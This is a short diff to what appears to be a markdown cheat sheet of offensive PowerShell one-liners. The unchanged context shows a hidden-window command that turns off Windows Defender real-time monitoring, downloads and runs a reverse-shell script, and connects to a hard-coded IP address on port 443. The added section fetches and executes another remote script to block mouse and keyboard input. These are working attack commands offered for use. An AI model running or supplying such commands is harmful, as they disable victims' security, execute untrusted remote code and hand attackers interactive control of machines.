@@ -45,6 +45,9 @@ powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConP
 ```
 powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
 ```
-
+### Disable Mouse/Keyboard Input - 4 seconds only (Bare with me for Now)
+```
+IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/testlol.ps1 -UseBasicParsing)
+```
 
 This Page May Have Loads of Error's since I suck at english so avoid em pls lol...
